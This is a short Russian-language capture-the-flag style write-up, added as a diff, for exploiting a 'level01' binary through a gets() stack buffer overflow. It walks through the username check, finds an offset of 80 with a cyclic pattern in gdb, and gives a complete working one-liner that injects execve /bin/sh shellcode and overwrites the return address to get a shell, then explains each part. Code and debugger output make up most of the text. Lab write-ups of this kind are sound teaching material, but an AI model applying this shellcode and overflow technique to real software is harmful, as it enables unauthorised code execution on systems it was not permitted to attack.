@@ -1,0 +1,49 @@
+Начинаем с того что изучаем экзикюшник level01
+
+Функция main вызывает 2 сторонние функции verify_user_name и verify_user_pass.
+Проверив их можно понять что нет никаких вызовов шелла, но так как используется функция gets можно попробовать воспользоваться ими.
+
+Функция verify_user_name сравнивает значение полученный от пользователя с "dat_wil" зная адрес начала стека и добавив + 7 мы можем записать наш shellcode который мы получаем 
+
+http://shell-storm.org/shellcode/files/shellcode-827.php
+
+и 2 наша функция verify_user_pass сравнивает полученный адрес с "admin", именно тут и будем вызывать переполнение стека.
+
+Используем этот сайт для нахождение offset
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+------------------------------------------------------------------------------------------
+
+(gdb) run
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+------------------------------------------------------------------------------------------
+
+Подставляем 0x37634136 и получаем offset 80.
+
+Подытоживая получаем простую команду))
+
+(python -c "print 'dat_wil' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\n' + 'a' * 80 + '\x08\x04\xa0\x47'[::-1]"; cat) | ./level01
+
+Кто здесь кто))
+
+dat_wil - login
+\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80 - shellcode
+'\n' - для того чтобы 1 get закончил чтение
+'a' * 80 - мусор для вызова переполнения
+\x08\x04\xa0\x47 - адрес shellcod-а который мы получаем плюсую к адресу началы стека, где лежит "dat_wil", 7
+[::-1] - для реверса адреса
+
+Учебный ресурс
+https://codeby.net/threads/perepolnenie-bufera-i-razmeschenie-shellkoda-v-pamjati-razrabotka-ehksplojtov-chast-6.67245/
